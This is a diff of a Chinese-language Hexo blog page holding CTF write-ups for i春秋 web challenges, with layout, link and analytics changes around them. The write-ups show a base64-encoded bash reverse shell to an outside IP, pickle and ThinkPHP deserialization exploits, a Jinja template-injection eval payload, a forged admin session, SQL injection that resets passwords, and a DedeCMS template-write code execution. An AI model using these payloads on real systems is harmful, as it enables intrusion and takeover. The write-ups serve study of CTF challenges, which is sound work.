@@ -13,10 +13,20 @@
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="format-detection" content="telephone=no">
+    <meta name="referrer" content="no-referrer-when-downgrade">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="referrer" content="no-referrer-when-downgrade">
     <!-- Global site tag (gtag.js) - Google Analytics -->
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BYTY196ENH"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+    
+      gtag('config', 'G-BYTY196ENH');
+    </script>
 
 
     <title>i春秋CTF刷题 | hybcx&#39;s blog</title>
@@ -262,7 +272,7 @@
         
         <li><div class="divider"></div></li>
         <li>
-            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+            <a href="https://github.com/hybchenxing/" class="waves-effect waves-light" target="_blank">
                 <i class="fab fa-github-square fa-fw"></i>Fork Me
             </a>
         </li>
@@ -319,7 +329,7 @@
     }
 </style>
 
-<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+<a href="https://github.com/hybchenxing/" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
    data-tooltip="Fork Me" data-position="left" data-delay="50">
     <svg viewBox="0 0 250 250" aria-hidden="true">
         <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
@@ -418,11 +428,6 @@
                 
 
                 
-                    <div id="busuanzi_container_page_pv" class="info-break-policy">
-                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
-                        <span id="busuanzi_value_page_pv"></span>
-                    </div>
-				
             </div>
         </div>
         <hr class="clearfix">
@@ -439,11 +444,11 @@
                 <h2 id="picup">picup</h2>
 <p>先dirsearch扫目录，发现login.php和register.php</p>
 <p>接着注册登录一个用户即可，会看到上传页面，这里也是尝试了多次才上传成功，上传成功之后会显示一个上传路径以及pic.php的东西，猜测这里就是给pic传参，能够目录遍历之类的</p>
-<p><img src="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/image-20240329173101448.png" alt="image-20240329173101448"></p>
+<p><img src="image-20240329173101448.png" alt="image-20240329173101448"></p>
 <p>这里跟着wp发现存在目录遍历，不过过滤了…/，但双写即可绕过（这里也是服了，一个php的站，结果是python的洞）</p>
-<p><img src="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/image-20240329173716854.png" alt="image-20240329173716854"></p>
+<p><img src="image-20240329173716854.png" alt="image-20240329173716854"></p>
 <p>接下来查看python源码</p>
-<p><img src="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/image-20240329173759808.png" alt="image-20240329173759808"></p>
+<p><img src="image-20240329173759808.png" alt="image-20240329173759808"></p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
 <span class="token keyword">import</span> pickle
 <span class="token keyword">import</span> base64
@@ -507,14 +512,14 @@ app<span class="token punctuation">.</span>secret_key<span class="token operator
 <p>这里主要看pic函数的处理就行，说是如果存在pic参数，且pic参数与uploads拼接之后的文件存在，则进入下一个if语句，继续判断如果session里面的username值为admin，就会调用pickle.load将文件内容反序列化出来，进而展示。</p>
 <p>很明显就是pickle的反序列化漏洞了，接下来看如何伪造admin的session</p>
 <p>这里也是看了wp才知道如何伪造的，这里用的是format的格式化漏洞，这个漏洞可参考p神：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html">Python 格式化字符串漏洞（Django为例）</a></p>
-<p><img src="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/image-20240406163736170.png" alt="image-20240406163736170"></p>
+<p><img src="image-20240406163736170.png" alt="image-20240406163736170"></p>
 <p>如上图，拿到了admin的password，利用他来伪造session（因为上述session的key就是admin的密码）</p>
 <pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">3720c7094d15e3d181c48d5199bcdde9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/image-20240406164220786.png" alt="image-20240406164220786"></p>
+<p><img src="image-20240406164220786.png" alt="image-20240406164220786"></p>
 <pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">eyJ1c2VybmFtZSI6ImFkbWluIn0.ZhEK1Q.8tM16cciuq2JtEt9gXj6Uj-olHg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>这里看wp直接上传的模板去RCE（poc文件）</p>
 <pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token punctuation">{</span><span class="token punctuation">{</span>lipsum[<span class="token string">'__glob'</span><span class="token string">'als__'</span>][<span class="token string">'__built'</span><span class="token string">'ins__'</span>][<span class="token string">'ev'</span><span class="token string">'al'</span>]<span class="token punctuation">(</span>request.data<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/image-20240406170143418.png" alt="image-20240406170143418"></p>
+<p><img src="image-20240406170143418.png" alt="image-20240406170143418"></p>
 <p>接着上传exp文件，之后利用pickle触发执行</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle
 <span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template
@@ -527,10 +532,10 @@ exp<span class="token operator">=</span>EXP<span class="token punctuation">(</sp
 f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"exp"</span><span class="token punctuation">,</span><span class="token string">"wb"</span><span class="token punctuation">)</span>
 pickle<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>exp<span class="token punctuation">,</span>f<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">bash -c <span class="token string">'{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/image-20240406173222514.png" alt="image-20240406173222514"></p>
+<p><img src="image-20240406173222514.png" alt="image-20240406173222514"></p>
 <p>由于flag没有读取权限，但clear.sh可读可写，且每十分钟会执行，写入echo cat /flag&gt;1.txt即可</p>
-<p><img src="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/image-20240406174751103.png" alt="image-20240406174751103"></p>
-<p><img src="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/image-20240406174740419.png" alt="image-20240406174740419"></p>
+<p><img src="image-20240406174751103.png" alt="image-20240406174751103"></p>
+<p><img src="image-20240406174740419.png" alt="image-20240406174740419"></p>
 <h3 id="参考文章">参考文章</h3>
 <p><a target="_blank" rel="noopener" href="https://z1d10t.fun/post/2f513685.html#picup">2023年春秋杯网络安全联赛冬季赛</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/135760457">2023年春秋杯网络安全联赛冬季赛 Writeup</a></p>
@@ -689,8 +694,8 @@ dict://127.0.0.1:6379/system.exec env
 echo <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$pop</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/image-20240406203404416.png" alt="image-20240406203404416"></p>
-<p><img src="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/image-20240406203612010.png" alt="image-20240406203612010"></p>
+<p><img src="image-20240406203404416.png" alt="image-20240406203404416"></p>
+<p><img src="image-20240406203612010.png" alt="image-20240406203612010"></p>
 <h2 id="Active-Takeaway">Active-Takeaway</h2>
 <p>Java题目，目前不会，看了看似乎很难，且没学过</p>
 <p>说是可以参考：<a target="_blank" rel="noopener" href="https://www.yulegeyu.com/">https://www.yulegeyu.com/</a></p>
@@ -698,7 +703,7 @@ echo <span class="token function">serialize</span><span class="token punctuation
 <p>获得提示弱密码为：admin@123。随后admin用户登录后台</p>
 <p>参考：[<a target="_blank" rel="noopener" href="http://www.xcxan.cn/archives/240">DedeCMS V5.7 SP2后台存在代码执行漏洞</a>](<a target="_blank" rel="noopener" href="http://www.xcxan.cn/archives/240">http://www.xcxan.cn/archives/240</a>)–进行复现即可</p>
 <pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">dede/tpl.php?filename=aahybcx.lib.php&amp;action=savetagfile&amp;content=&lt;?=`cat /flag`<span class="token punctuation">;</span>?&gt;&amp;token=f32f26ac2fb800623e06fa0c3d9155ef<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/image-20240407145533228.png" alt="image-20240407145533228"></p>
+<p><img src="image-20240407145533228.png" alt="image-20240407145533228"></p>
 <p>这里用个短标签绕过即可</p>
 <h3 id="参考文章-2">参考文章</h3>
 <p><a target="_blank" rel="noopener" href="https://5ime.cn/cqgame-2023-winter.html">春秋杯冬季赛 2023 Writeup</a></p>
@@ -709,12 +714,12 @@ echo <span class="token function">serialize</span><span class="token punctuation
 <p>之后才能看到正常页面，之后依旧是看的答案（说是个1day）</p>
 <p>跟着复现，首先前端存在update注入（真不知道比赛的时候如何才会想到，唉）</p>
 <pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">admin<span class="token string">';update admins set password='</span>c26be8aaf53b15054896983b43eb6a65'<span class="token punctuation">;</span>--<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/image-20240407154008060.png" alt="image-20240407154008060"></p>
+<p><img src="image-20240407154008060.png" alt="image-20240407154008060"></p>
 <p>忽略报错，之后登录即可，如果登录过后还是404，继续随机验证码绕过，这里还可以发现依旧存在xss漏洞</p>
-<p><img src="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/image-20240407154332067.png" alt="image-20240407154332067"></p>
+<p><img src="image-20240407154332067.png" alt="image-20240407154332067"></p>
 <p>接下来添加计划任务RCE即可，这里我反弹shell</p>
-<p><img src="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/image-20240407154548715.png" alt="image-20240407154548715"></p>
-<p><img src="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/image-20240407154617328.png" alt="image-20240407154617328"></p>
+<p><img src="image-20240407154548715.png" alt="image-20240407154548715"></p>
+<p><img src="image-20240407154617328.png" alt="image-20240407154617328"></p>
 <p>成功拿到shell，回顾一下还是难以理解，我不知道哪里能得知该系统版本，大佬思路想象不到</p>
 <h3 id="参考文章-3">参考文章</h3>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/dustfree/p/17458695.html">phpstudy小皮面板2023版RCE</a></p>
@@ -767,7 +772,7 @@ ios
 system
 <span class="token string">''</span>'
 <span class="token function">print</span><span class="token punctuation">(</span>base64.<span class="token function">b64encode</span><span class="token punctuation">(</span>opcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/image-20240407162321443.png" alt="image-20240407162321443"></p>
+<p><img src="image-20240407162321443.png" alt="image-20240407162321443"></p>
 <h3 id="参考文章-4">参考文章</h3>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/akxnxbshai/article/details/130772174">2023年春秋杯网络安全联赛 春季赛 wp</a></p>
 <h2 id="call">call</h2>
@@ -814,38 +819,38 @@ system
         <span class="token punctuation">.</span><span class="token keyword">await</span>
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>这里不太理解，代码说是index函数下，会处理filename参数内容，如果出现p则置空，这里是可以目录穿越的，题目也提示在work目录下。感觉像是文字游戏，这里读取当前目录就会发现存在flag，难道work意味着工作目录，而不是work目录？</p>
-<p><img src="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/image-20240407190541068.png" alt="image-20240407190541068"></p>
+<p><img src="image-20240407190541068.png" alt="image-20240407190541068"></p>
 <h2 id="qqcms">qqcms</h2>
 <p>这道题考察代码审计，由于没学过，即使能看懂PHP代码感觉也是无从下手，因此就直接跟着wp看漏洞点，等下周学了一步步进阶吧。</p>
 <h3 id="标签内sql注入">标签内sql注入</h3>
 <p>万能标签：列表形式调用数据库里任何数据</p>
 <pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token punctuation">{</span><span class="token punctuation">{</span>loop sql=<span class="token string">'select * from qc_user'</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/image-20240424165231941.png" alt="image-20240424165231941"></p>
+<p><img src="image-20240424165231941.png" alt="image-20240424165231941"></p>
 <p>可以看到这里的搜索框存在sql注入，定位到源码就是这个位置</p>
-<p><img src="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/image-20240424165301896.png" alt="image-20240424165301896"></p>
+<p><img src="image-20240424165301896.png" alt="image-20240424165301896"></p>
 <p>跟进tempRun</p>
-<p><img src="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/image-20240424165726337.png" alt="image-20240424165726337"></p>
+<p><img src="image-20240424165726337.png" alt="image-20240424165726337"></p>
 <p>这里根据wp：跟进tempRun，发现对页面解析了所有的标签</p>
 <p>继续跟进loop_Tmp，看到对页面进行了正则匹配，正好我们通过Search传参可以在页面写入标签（赋个照片）</p>
-<p><img src="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/image-20240424165811052.png" alt="image-20240424165811052"></p>
+<p><img src="image-20240424165811052.png" alt="image-20240424165811052"></p>
 <p>执行sql语句，修改账号密码</p>
 <pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token punctuation">{</span><span class="token punctuation">{</span>loop sql=<span class="token string">'update qc_user set Password=md5(114514),Phone=16666666666'</span><span class="token punctuation">}</span><span class="token punctuation">}</span>test<span class="token punctuation">{</span><span class="token punctuation">{</span>/loop<span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/image-20240424165835592.png" alt="image-20240424165835592"></p>
+<p><img src="image-20240424165835592.png" alt="image-20240424165835592"></p>
 <p>至于原因我们可以继续跟进replaceLoop，如下图，发现执行了sql查询，继续跟进</p>
-<p><img src="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/image-20240424165916781.png" alt="image-20240424165916781"></p>
+<p><img src="image-20240424165916781.png" alt="image-20240424165916781"></p>
 <p>看到这里是底层逻辑，执行了sql对应的sql语句。</p>
-<p><img src="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/image-20240424165957412.png" alt="image-20240424165957412"></p>
+<p><img src="image-20240424165957412.png" alt="image-20240424165957412"></p>
 <p>在刚才的查询框执行即可</p>
-<p><img src="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/image-20240424170429117.png" alt="image-20240424170429117"></p>
-<p><img src="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/image-20240424170247597.png" alt="image-20240424170247597"></p>
+<p><img src="image-20240424170429117.png" alt="image-20240424170429117"></p>
+<p><img src="image-20240424170247597.png" alt="image-20240424170247597"></p>
 <h3 id="后台任意文件读取漏洞">后台任意文件读取漏洞</h3>
 <p>登录后台利用文件包含漏洞即可</p>
 <p>引入组件：引入一些通用代码页面，比如一个网站的导航和底部都是一样的，就单独做一个组件，通过include标签引入</p>
 <pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token punctuation">{</span><span class="token punctuation">{</span>include filename=<span class="token string">'component_header.html'</span>/<span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>遍历一下即可读取</p>
-<p><img src="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/image-20240424171953841.png" alt="image-20240424171953841"></p>
+<p><img src="image-20240424171953841.png" alt="image-20240424171953841"></p>
 <p>定位到代码，就是下图，可以看到对html没有做出过滤</p>
-<p><img src="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/image-20240424172013142.png" alt="image-20240424172013142"></p>
+<p><img src="image-20240424172013142.png" alt="image-20240424172013142"></p>
 <h3 id="参考文章-5">参考文章</h3>
 <p><a target="_blank" rel="noopener" href="http://www.bmth666.cn/2023/06/28/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-qqcms%E5%A4%8D%E7%8E%B0/">2023春秋杯春季赛 qqcms复现</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/akxnxbshai/article/details/130772174">2023年春秋杯网络安全联赛 春季赛 wp</a></p>
@@ -883,7 +888,7 @@ system
 <span class="token punctuation">}</span>
 
 <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/image-20240424175550399.png" alt="image-20240424175550399"></p>
+<p><img src="image-20240424175550399.png" alt="image-20240424175550399"></p>
 <h3 id="参考文章-6">参考文章</h3>
 <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/321546.html">ThinkPHP6.0.12LTS反序列漏洞分析</a></p>
 <p><a target="_blank" rel="noopener" href="https://linuz.me/article/2022-CISCNCTF-Writeup">2022第十五届全国大学生信息安全竞赛创新实践能力赛-初赛部分WP</a></p>
@@ -925,11 +930,11 @@ f<span class="token operator">=</span><span class="token string">""</span>
             <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>
             <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>但这里手动测试，我不理解为何总是返回500</p>
-<p><img src="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/image-20240424194845829.png" alt="image-20240424194845829"></p>
+<p><img src="image-20240424194845829.png" alt="image-20240424194845829"></p>
 <p>最终爆破结果为</p>
 <pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">awk785969awlfjnlkjlii!@$%!!
 PAssw40d_Y0u3_Never_Konwn!@!!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/image-20240424195013292.png" alt="image-20240424195013292"></p>
+<p><img src="image-20240424195013292.png" alt="image-20240424195013292"></p>
 <p>进去之后，题目提示我们这段代码被这个网址加密了，网上找相应解密脚本即可（但都太老了，好难用）我也没成功，直接附上结果了</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -1169,7 +1174,7 @@ PAssw40d_Y0u3_Never_Konwn!@!!<span aria-hidden="true" class="line-numbers-rows">
     <div id="rewardModal" class="modal">
         <div class="modal-content">
             <a class="close modal-close"><i class="fas fa-times"></i></a>
-            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <h4 class="reward-title">随缘，看各位佬的心情</h4>
             <div class="reward-content">
                 <div class="reward-tabs">
                     <ul class="tabs row">
@@ -1177,7 +1182,7 @@ PAssw40d_Y0u3_Never_Konwn!@!!<span aria-hidden="true" class="line-numbers-rows">
                         <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                     </ul>
                     <div id="alipay">
-                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                        <img src="/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
                     </div>
                     <div id="wechat">
                         <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
@@ -1457,12 +1462,12 @@ PAssw40d_Y0u3_Never_Konwn!@!!<span aria-hidden="true" class="line-numbers-rows">
 <script>
     new Valine({
         el: '#vcomments',
-        appId: 'fYyLqrwhVuigWcIYcP9sPbBv-MdYXbMMI',
-        appKey: 'ht8iOzVaHwm0miBUeumGrxDF',
-        serverURLs: '',
+        appId: 'u0n6SeKEfoilg30pN4VxouXR-MdYXbMMI',
+        appKey: '36SdcVNDUm7oJBLF0OpXO4ut',
+        serverURLs: 'https://u0n6seke.api.lncldglobal.com',
         notify: 'false' === 'true',
         verify: 'false' === 'true',
-        visitor: 'true' === 'true',
+        visitor: 'false' === 'true',
         avatar: 'mm',
         pageSize: '10',
         lang: 'zh-cn',
@@ -1595,6 +1600,8 @@ PAssw40d_Y0u3_Never_Konwn!@!!<span aria-hidden="true" class="line-numbers-rows">
 
 <!-- 代码块收缩 -->
 
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
 
 
     </div>
@@ -1622,8 +1629,8 @@ PAssw40d_Y0u3_Never_Konwn!@!!<span aria-hidden="true" class="line-numbers-rows">
             tocSelector: '#toc-content',
             contentSelector: '#articleContent',
             headingsOffset: -($(window).height() * 0.4 - 45),
-            collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4'
+            collapseDepth: Number('3'),
+            headingSelector: 'h2, h3, h4, h5, h6'
         });
 
         // Set scroll toc fixed.
@@ -1706,8 +1713,6 @@ PAssw40d_Y0u3_Never_Konwn!@!!<span aria-hidden="true" class="line-numbers-rows">
             
             
             
-                
-            
             
                 <span id="busuanzi_container_site_pv">
                 &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
@@ -1727,24 +1732,28 @@ PAssw40d_Y0u3_Never_Konwn!@!!<span aria-hidden="true" class="line-numbers-rows">
             <br>
             
         </div>
-        <div class="col s12 m4 l4 social-link social-statis">
-    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <div class="col s12 m4 l4 social-link ">
+    <a href="https://github.com/hybchenxing/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
         <i class="fab fa-github"></i>
     </a>
 
 
 
-    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <a href="mailto:2235199080@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
         <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="https://www.facebook.com/profile.php?id=61555427038857" class="tooltipped" target="_blank" data-tooltip="关注我的Facebook: https://www.facebook.com/profile.php?id=61555427038857" data-position="top" data-delay="50">
+        <i class="fab fa-facebook-f"></i>
     </a>
 
 
 
 
 
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2235199080" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2235199080" data-position="top" data-delay="50">
         <i class="fab fa-qq"></i>
     </a>
 
@@ -1956,8 +1965,6 @@ $(function () {
     
     <script src="/libs/others/clicklove.js" async="async"></script>
     
-    
-    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
     
 
     
